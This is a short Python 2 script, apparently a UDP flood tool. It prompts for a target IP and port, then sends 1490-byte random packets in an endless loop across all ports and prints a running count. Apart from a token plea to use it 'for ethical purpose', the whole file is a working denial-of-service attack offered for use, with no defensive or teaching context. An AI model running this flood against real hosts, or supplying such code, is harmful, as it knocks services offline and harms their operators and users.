#!/system/bin/python
import socket, os, random, time

# sex time #
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
##############################

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")
print "pls use this for ethical purpose or i'll have to take my project down :("
print
ip = raw_input('[$] Target IP: ')
port = input('[$] Port: ')
os.system("clear")
print "ping attack started on {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year)
time.sleep(3)
print
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1